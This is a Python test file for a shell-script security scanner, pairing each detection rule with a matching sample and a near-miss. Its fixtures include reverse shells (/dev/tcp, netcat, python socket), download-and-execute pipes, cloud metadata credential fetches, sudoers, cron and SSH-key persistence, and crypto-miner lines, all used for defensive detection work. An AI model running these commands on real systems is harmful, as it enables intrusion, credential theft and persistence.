"""One positive and one near-miss sample per static script rule (#14)."""

import dataclasses
import re
import time

import pytest  # type: ignore
import yaml  # pyright: ignore[reportMissingModuleSource]

from tmi_tf.script_scan import (
    CATEGORIES,
    RULES_PATH,
    SEVERITIES,
    load_rules,
    mask_secrets,
    match_rules,
)

RULES = {r.id: r for r in load_rules()}

# rule id -> (must match, must NOT match)
SAMPLES = {
    "curl_pipe_sh": ("curl -s http://x.io/a.sh | sh", "curl -o a.sh http://x.io/a.sh"),
    "wget_pipe_sh": ("wget -qO- http://x/i | bash", "wget http://x/i -O /tmp/i"),
    "download_then_exec": (
        "curl -o /tmp/a http://x && chmod +x /tmp/a && /tmp/a",
        "curl -o /tmp/a.txt http://x",
    ),
    "base64_decode_exec": (
        "echo aGk= | base64 -d | sh",
        "echo aGk= | base64 -d > f.txt",
    ),
    "xxd_decode_exec": ("xxd -r -p payload | bash", "xxd -p file"),
    "eval_dynamic": ('eval "$(curl http://x)"', "evaluate results"),
    "dev_tcp_shell": ("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", "echo /dev/null"),
    "netcat_exec": ("nc -e /bin/sh 10.0.0.1 4444", "nc -zv host 80"),
    "python_reverse_shell": (
        "python -c 'import socket,subprocess;s=socket.socket()'",
        "python -c 'print(1)'",
    ),
    "setenforce_off": ("setenforce 0", "setenforce 1"),
    "selinux_disabled": ("SELINUX=disabled", "SELINUX=enforcing"),
    "firewall_disabled": ("ufw disable", "ufw enable"),
    "iptables_flush": ("iptables -F", "iptables -L"),
    "stop_security_service": ("systemctl stop auditd", "systemctl stop nginx"),
    "chmod_777": ("chmod 777 /var/app", "chmod 755 /var/app"),
    "sudoers_nopasswd_all": (
        "echo 'ALL ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers",
        "echo 'deploy ALL=(ALL) NOPASSWD: /usr/bin/systemctl restart app' >> /etc/sudoers.d/deploy",
    ),
    "aws_access_key_id": (
        "AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE",
        "AWS_ACCESS_KEY_ID=$(vault read x)",
    ),
    "aws_secret_key": (
        "aws_secret_access_key = wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
        "aws_secret_access_key = ${var.secret}",
    ),
    "password_assignment": ("password=Sup3rS3cret!", "password=${PASSWORD}"),
    "private_key_block": (
        "-----BEGIN RSA PRIVATE KEY-----",
        "-----BEGIN CERTIFICATE-----",
    ),
    "bearer_token": (
        "Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.e30.abc",
        "Authorization: Bearer $TOKEN",
    ),
    "xmrig": ("./xmrig -o pool.x:3333", "grep -v xmrigate"),
    "stratum_pool": (
        "stratum+tcp://pool.minexmr.com:4444",
        "https://stratum.example.com/docs",
    ),
    "imds_credentials": (
        "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "curl http://169.254.169.254/latest/meta-data/instance-id",
    ),
    "gcp_metadata_token": (
        "curl -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
        "curl -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/zone",
    ),
    "azure_imds_token": (
        "curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01'",
        "curl http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    ),
    "cron_remote": (
        "(crontab -l; echo '* * * * * curl http://x/a | sh') | crontab -",
        "echo '0 3 * * * /usr/local/bin/backup.sh' | crontab -",
    ),
    "authorized_keys_remote": (
        "curl http://x/k >> ~/.ssh/authorized_keys",
        "cat /tmp/deploy.pub >> ~/.ssh/authorized_keys",
    ),
}


def test_rule_file_is_complete_and_valid():
    assert set(SAMPLES) == set(RULES), set(SAMPLES) ^ set(RULES)
    for r in RULES.values():
        assert r.category in CATEGORIES and r.severity in SEVERITIES
        assert r.threat_hint in "STRIDE" and len(r.threat_hint) == 1
    assert {r.category for r in RULES.values()} == CATEGORIES


@pytest.mark.parametrize("rule_id", sorted(SAMPLES))
def test_positive_and_near_miss(rule_id):
    positive, near_miss = SAMPLES[rule_id]
    hits = {
        h.rule_id
        for h in match_rules(f"#!/bin/bash\n{positive}\n", list(RULES.values()))
    }
    assert rule_id in hits
    assert rule_id not in {
        h.rule_id
        for h in match_rules(f"#!/bin/bash\n{near_miss}\n", list(RULES.values()))
    }


def test_hits_grouped_per_rule_with_count_and_evidence():
    hits = match_rules("curl a | sh\ncurl b | sh\n", list(RULES.values()))
    (hit,) = [h for h in hits if h.rule_id == "curl_pipe_sh"]
    assert hit.count == 2 and hit.evidence == "curl a | sh"


def test_secret_rule_evidence_is_masked():
    (hit,) = match_rules("password=Sup3rS3cret!", list(RULES.values()))
    assert hit.secret and hit.evidence == "[masked-secret]"


def test_mask_secrets():
    text = "export AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE\ncurl x | sh\n"
    masked = mask_secrets(text, list(RULES.values()))
    assert "AKIAIOSFODNN7EXAMPLE" not in masked and "[masked-secret]" in masked
    assert "curl x | sh" in masked


def test_non_secret_rule_evidence_masks_embedded_secret():
    text = 'curl -H "Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.e30.abc" https://x/a.sh | sh'
    (hit,) = [
        h
        for h in match_rules(text, list(RULES.values()))
        if h.rule_id == "curl_pipe_sh"
    ]
    assert not hit.secret
    assert "eyJhbGciOiJIUzI1NiJ9.e30.abc" not in hit.evidence
    assert "[masked-secret]" in hit.evidence


def test_private_key_body_is_masked():
    text = (
        "-----BEGIN RSA PRIVATE KEY-----\n"
        "MIIBOgIBAAJBAKj34GkxFhD90vcNLYLInFEr8cff8oWTz3rq9vY/wF0Sf9Yq5/rN\n"
        "-----END RSA PRIVATE KEY-----\n"
    )
    masked = mask_secrets(text, list(RULES.values()))
    assert "MIIBOgIBAAJBAKj34GkxFhD90vcNLYLInFEr8cff8oWTz3rq9vY" not in masked
    assert "[masked-secret]" in masked


def test_password_assignment_excludes_pwd_and_path_values():
    rules = list(RULES.values())
    positive = match_rules("#!/bin/bash\npassword=Sup3rS3cret!\n", rules)
    assert "password_assignment" in {h.rule_id for h in positive}

    for near_miss in ("PWD=/opt/app", "pwd: /var/app", "password=/etc/shadow"):
        hits = match_rules(f"#!/bin/bash\n{near_miss}\n", rules)
        assert "password_assignment" not in {h.rule_id for h in hits}, near_miss


def test_chmod_sticky_tmp_idiom_not_flagged():
    hits = match_rules("#!/bin/bash\nchmod 1777 /tmp\n", list(RULES.values()))
    assert "chmod_777" not in {h.rule_id for h in hits}


def test_wget_pipe_sudo_bash_flagged():
    hits = match_rules(
        "#!/bin/bash\nwget -qO- http://x/i | sudo -E bash -\n", list(RULES.values())
    )
    assert "wget_pipe_sh" in {h.rule_id for h in hits}


def test_netcat_attached_shell_path_flagged():
    hits = match_rules("#!/bin/bash\nnc host 1 -e/bin/sh\n", list(RULES.values()))
    assert "netcat_exec" in {h.rule_id for h in hits}


def test_load_rules_rejects_duplicate_ids(tmp_path):
    raw = yaml.safe_load(RULES_PATH.read_text(encoding="utf-8"))
    dup = dict(raw["rules"][0])
    raw["rules"] = [*raw["rules"], dup]
    dup_path = tmp_path / "dup_rules.yaml"
    dup_path.write_text(yaml.safe_dump(raw), encoding="utf-8")
    with pytest.raises(ValueError, match="duplicate"):
        load_rules(dup_path)


def _line(unit: str, target_len: int = 4000) -> str:
    """A ~target_len-char line built by repeating ``unit``."""
    return unit * max(1, target_len // len(unit))


def _best_time(text: str, rules: list) -> float:
    """Fastest of 3 match_rules runs; the minimum is the least noisy sample."""
    best = float("inf")
    for _ in range(3):
        start = time.monotonic()
        match_rules(text, rules)
        best = min(best, time.monotonic() - start)
    return best


def _length_scaling(
    rules: list, prefix: str, unit: str, lines: int, short_len: int
) -> tuple[float, float]:
    """Time match_rules on ``lines`` lines of ``short_len`` chars, then on
    lines 4x as long, and return (short_time, long_time). Line count is held
    fixed because the DoS risk is quadratic work *within* one long line; a
    per-line scan is always linear in the number of lines."""
    times = []
    for length in (short_len, 4 * short_len):
        line = prefix + _line(unit, length - len(prefix))
        times.append(_best_time("\n".join([line] * lines), rules))
    return times[0], times[1]


# A linear scan grows ~4x when lines get 4x longer; a quadratic one ~16x.
MAX_LINEAR_RATIO = 8.0

# Each shape is a rule's worst-case repeating token with no closing token
# anywhere, forcing the full failure path.
ADVERSARIAL_SHAPES = {
    "authorized_keys_remote": ("", "curl >> "),
    "download_then_exec": ("", "curl a&&"),
    "cron_remote": ("crontab ", "curl ;"),
    "python_reverse_shell": ("python -c ", "socket "),
}


def test_match_rules_linear_time_on_adversarial_multiline_input():
    """DoS regression (#14), round 2: {0,400}-bounded gaps alone are still
    quadratic *within* one long line (a bounded gap can still be retried at
    every occurrence of the next required token inside the bound).

    The check is the growth ratio as lines get 4x longer, not a fixed time
    limit: CI runners are ~2x slower than a dev Mac, and a fixed 2s limit on
    a 1MB input failed every main run at 2.45-2.64s although the scan was
    linear. The absolute backstop catches a catastrophic regression that
    the ratio could miss (e.g. both sizes already far past the bound)."""
    rules = list(RULES.values())
    for rule_id, (prefix, unit) in ADVERSARIAL_SHAPES.items():
        short, long_ = _length_scaling(rules, prefix, unit, 100, 1000)
        ratio = long_ / max(short, 1e-3)
        assert ratio < MAX_LINEAR_RATIO, (
            f"{rule_id}: 4x longer lines took {ratio:.1f}x as long "
            f"({short:.3f}s -> {long_:.3f}s); scan is superlinear per line"
        )
        assert long_ < 5.0, f"{rule_id}: 100 x 4000-char lines took {long_:.3f}s"
        # No closing token is present, so the rule must never match.
        text = "\n".join([prefix + _line(unit, 1000 - len(prefix))] * 100)
        assert rule_id not in {h.rule_id for h in match_rules(text, rules)}


def test_length_scaling_detects_quadratic_pattern():
    """Self-test for _length_scaling: an unbounded-gap variant of
    authorized_keys_remote (the pre-#14 shape) is quadratic per line and must
    exceed MAX_LINEAR_RATIO; the shipped bounded pattern must not. Inputs are
    small because the quadratic variant would take minutes at 1MB."""
    shipped = RULES["authorized_keys_remote"]
    quadratic = dataclasses.replace(
        shipped,
        pattern=re.compile(
            r"(curl|wget)[^\n>]*>>?[^\n]*?authorized_keys", re.IGNORECASE
        ),
    )
    short, long_ = _length_scaling([quadratic], "", "curl >> ", 10, 1000)
    assert long_ / max(short, 1e-3) > MAX_LINEAR_RATIO, (short, long_)
    short, long_ = _length_scaling([shipped], "", "curl >> ", 100, 1000)
    assert long_ / max(short, 1e-3) < MAX_LINEAR_RATIO, (short, long_)


def test_long_line_padding_does_not_evade_detection():
    """Regression (#14): match_rules() used to truncate each line to 4000
    chars, so a payload placed after that point was silently skipped. There
    is no line cap now; a payload far into a long line must still fire."""
    pad = " " * 5000
    rules = list(RULES.values())
    cases = {
        "curl_pipe_sh": pad + "curl http://x/a.sh | sh",
        "dev_tcp_shell": pad + "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
        "setenforce_off": pad + "setenforce 0",
        "aws_access_key_id": pad + "AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE",
    }
    for rule_id, text in cases.items():
        hits = {h.rule_id for h in match_rules(text, rules)}
        assert rule_id in hits, rule_id


def test_curl_pipe_sudo_with_argument_flagged():
    hits = match_rules("#!/bin/bash\ncurl u | sudo -u root sh\n", list(RULES.values()))
    assert "curl_pipe_sh" in {h.rule_id for h in hits}
